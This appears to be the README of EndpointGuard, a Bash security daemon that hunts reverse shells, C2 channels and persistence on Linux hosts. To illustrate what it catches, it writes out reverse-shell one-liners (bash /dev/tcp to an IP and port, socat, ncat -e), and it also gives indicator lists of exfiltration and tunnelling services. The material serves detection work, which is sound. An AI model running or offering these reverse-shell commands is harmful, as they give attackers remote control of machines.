<div align="center">

# 🛡️ EndpointGuard v5.0 — Linux Sentinel

### Reverse-shell, C2 and persistence hunter for Linux

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)](LICENSE)
[![Bash](https://img.shields.io/badge/Built_With-Bash-4EAA25?style=for-the-badge&logo=gnu-bash&logoColor=white)](https://www.gnu.org/software/bash/)
[![Linux](https://img.shields.io/badge/Platform-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://www.linux.org/)
[![Security](https://img.shields.io/badge/Focus-Cybersecurity-red?style=for-the-badge&logo=hackthebox&logoColor=white)](https://github.com/Mr-N1ck/EndpointGuard)
[![ShellCheck](https://img.shields.io/badge/ShellCheck-Passing-brightgreen?style=for-the-badge)](https://www.shellcheck.net/)

> **Pure-Bash endpoint security daemon that hunts active reverse shells, severs C2 channels, quarantines payloads and cleans persistence — all from a single interactive menu. No command arguments. No config editing.**

</div>

---

## What v5 actually does

When you run a payload like the one below on a v4-protected box, v4 **did not stop it** because it inspected `ps` strings, not file descriptors:

```bash
sh -i >& /dev/tcp/192.168.1.17/9001 0>&1
```

v5 catches this — and every other reverse-shell variant — because it reads `/proc/<pid>/fd` and asks a single question: *"Is this shell process talking to a network socket on stdin/stdout/stderr?"* If yes, it's a reverse shell. End of story. Language doesn't matter.

| Threat | v4 result | v5 result |
|---|---|---|
| `bash -i >& /dev/tcp/IP/PORT 0>&1` | ❌ missed once forked | ✅ killed + connection severed + IP blocked |
| `python -c "...socket.connect()...exec()..."` | ❌ regex miss on argv | ✅ caught via fd inspection |
| `perl -e "...socket...exec..."` | ❌ regex miss on argv | ✅ caught via fd inspection |
| `socat TCP:attacker:port EXEC:/bin/bash` | ❌ not in patterns | ✅ caught via fd inspection |
| `ncat -e /bin/sh attacker port` | ❌ partial regex | ✅ caught via fd inspection |
| Discord webhook exfil | ❌ not detected | ✅ argv + dropped-file scanner |
| Telegram bot C2 | ❌ not detected | ✅ argv + dropped-file scanner |
| ngrok/serveo tunnel | ❌ not detected | ✅ C2 indicator list |
| Pastebin / 0x0.st / transfer.sh staging | ❌ not detected | ✅ C2 indicator list |
| Periodic call-home (60s beacon) | ❌ not detected | ✅ beaconing detector |
| Cron / systemd / .bashrc trojan | ❌ alert only | ✅ alert + clean + quarantine |
| Live TCP connection after kill | ❌ stays in CLOSE_WAIT | ✅ `ss -K` + `conntrack -D` flush |

---

## Install

```bash
git clone https://github.com/Mr-N1ck/EndpointGuard.git
cd EndpointGuard
sudo bash install.sh
```

Then launch the menu:

```bash
sudo endpointguard
```

That's the entire UX. Every action lives behind a numbered menu item. No flags, no config files to edit, no documentation to skim.

---

## Main menu

```
   1) Start protection daemon
   2) Restart protection daemon
   3) Run on-demand security scan       <- find + kill + quarantine NOW
   4) Show status
   5) View logs / blocked / quarantine
   6) Block IP (manual)
   7) Unblock IP
   8) Test Telegram alerts
   9) Setup / reconfigure
  10) Install as systemd service (auto-start at boot)
  11) Uninstall completely
  12) About / what's new
   0) Exit
```

The first run automatically launches a setup wizard that:
- detects your username and current SSH source IP
- pre-fills your local interface IPs
- detects your LAN subnet
- asks for a Telegram bot token (or skip with Enter)
- writes a clean config to `/opt/.epg/config.conf`

You never edit the source script.

---

## Detection techniques

### 1. Reverse-shell hunter — `/proc/<pid>/fd` inspection

Every 3 seconds, EPG walks every PID and checks:

1. Is the binary a shell or interpreter? (bash, sh, dash, zsh, busybox, python, perl, ruby, php, lua, node, awk, socat, ncat, openssl, …)
2. Are fds 0/1/2 connected to a network socket?
3. Map the socket inode through `/proc/net/tcp{,6}` to the remote endpoint.
4. Is the remote not us and not loopback?

If all four are true: **reverse shell**. Kill the PID, kill its children, sever the connection at the kernel (`ss -K` + `conntrack -D`), block the remote IP in INPUT/OUTPUT/FORWARD, and quarantine the originating script.

This works regardless of how the payload was invoked: file, `bash -c`, base64, eval, here-doc, anonymous pipe — fds don't lie.

### 2. C2 and exfil channel detector

Scans every process's `/proc/<pid>/cmdline` and every recently-modified file in `/tmp`, `/var/tmp`, `/dev/shm`, `/home/*` and `/root` for indicators including:

- Discord webhooks (`discord.com/api/webhooks`, all subdomains)
- Telegram bots (`api.telegram.org/bot`, `t.me`, `telegra.ph`)
- Tunneling services (`ngrok.io`, `ngrok-free.app`, `serveo.net`, `localtunnel.me`, `loca.lt`, `trycloudflare.com`)
- Paste/exfil sites (`pastebin.com/raw`, `paste.ee/r/`, `hastebin.com/raw`, `dpaste.com/raw`, `rentry.co`, `transfer.sh`, `0x0.st`, `anonfiles.com`, `bashupload.com`, `termbin.com`, `ix.io`, `envs.sh`, `filebin.net`, `file.io`, `gofile.io`)
- Out-of-band callbacks (`webhook.site`, `interact.sh`, `oast.fun`, `burpcollaborator.net`, `pipedream.net`, `requestcatcher.com`)

Action: kill the process, quarantine the file, alert.

### 3. Beaconing detector

Records all outbound `ESTABLISHED` connections every 30 seconds. If the same `(remote_ip, binary)` pair appears 4 or more times in a 15-minute window with low interval variance (<30s stddev), it's a beacon. Block the remote.

### 4. Kernel-level connection severing

After a kill, v4 left the TCP connection in `CLOSE_WAIT` because the socket lived in the kernel. v5 uses:

- `ss -K dst <ip>` — the only Linux interface that drops live sockets
- `conntrack -D -d <ip>` — flush conntrack so the connection cannot resume
- iptables drop on `INPUT`, `OUTPUT` and `FORWARD`

The attacker's terminal hangs immediately.

### 5. Quarantine system

Malicious files are not deleted (preserves forensics). They're moved to `/opt/.epg/quarantine/` with `chmod 000`, hashed, and logged with their original path. View via menu option 5.

### 6. Deep persistence sweep

Every few minutes, EPG scans:

- `/etc/crontab`, `/etc/cron.{d,hourly,daily,weekly,monthly}`, `/var/spool/cron/`
- `/etc/rc.local`, `/etc/init.d/`, `/etc/xdg/autostart/`
- `/etc/profile`, `/etc/profile.d/`, `/etc/bash.bashrc`, `/etc/bashrc`, `/etc/zsh/zshrc`
- All systemd unit directories
- Every user's `.bashrc`, `.bash_profile`, `.profile`, `.zshrc`, `.bash_login`, `.bash_logout`, `.config/autostart`, `.ssh/rc`
- All `~/.ssh/authorized_keys`
- `/etc/ld.so.preload` (rootkit indicator)

When a malicious entry is found, EPG:
- For config files: strips the bad lines and keeps a `.epg_pre_clean.<ts>` backup
- For systemd units: stops, disables, and quarantines
- For dropped scripts: quarantines whole

### 7. Watchdog + self-healing PAM hook

Every 30 seconds, the watchdog checks each monitor module's PID. If any died, it's restarted. The PAM self-healer reinstalls the hook in `/etc/pam.d/{sshd,login,su}` if the attacker removed it.

### 8. Honeypot redirect for compromised accounts

When a trusted user logs in from an untrusted IP (suggesting a credential theft), EPG redirects only that PTY to a fake environment with logged input, blocks the source IP, and severs the SSH connection — without touching your own active session.

---

## Three safety modes

| Mode | What it does |
|---|---|
| `monitor` | Detect everything, change nothing. Alerts only. Safe to run anywhere. |
| `moderate` | `monitor` + auto-block brute-force IPs. |
| `active` | Full response: kill processes, sever connections, block IPs, quarantine files, lock accounts, redirect to honeypot. **Default.** |

Set in the menu (option 9). Defaults to `active`.

---

## Self-lockout prevention

At every startup EPG auto-detects:
- All local interface IPs
- Your current SSH source IP (`SSH_CLIENT`)
- All IPs where your trusted user is currently logged in
- Your configured trusted IPs and networks

These IPs are hard-allowlisted. EPG will refuse to block them even in active mode. If you log in from a new IP not on this list, you'll see a one-time "Owner Login Detected" alert.

---

## File layout

```
/opt/.epg/
├── endpointguard.sh          # main script
├── config.conf               # auto-generated from setup wizard
├── epg.log                   # all events
├── alerts.log                # CRITICAL/HIGH only
├── blocked.list              # blocked IPs with timestamp + reason
├── killed_conns.log          # severed connections
├── quarantine/               # locked malicious files (chmod 000)
│   └── quarantine.log        # what came from where
├── honeypot/                 # fake env for jailed users
├── baselines/                # file hashes, port lists, etc.
├── locks/                    # flock files
└── pam_alerts.fifo           # PAM hook → daemon channel
```

---

## Compatibility

- Any Linux with kernel 3.x or newer
- Bash 4.0+
- Optional but recommended: `flock`, `inotifywait`, `conntrack`, `curl`, `ss`
- Memory: ~25 MB
- CPU: negligible (adaptive — backs off automatically under load)

---

## License

MIT — see [LICENSE](LICENSE).

## Disclaimer

For authorised defensive use only. The author is not responsible for misuse.

---

<div align="center">

Built by **Prince Gaur** ([@Mr-N1ck](https://github.com/Mr-N1ck)) for the Linux security community.

If EPG saves your box, leave a ⭐.

</div>
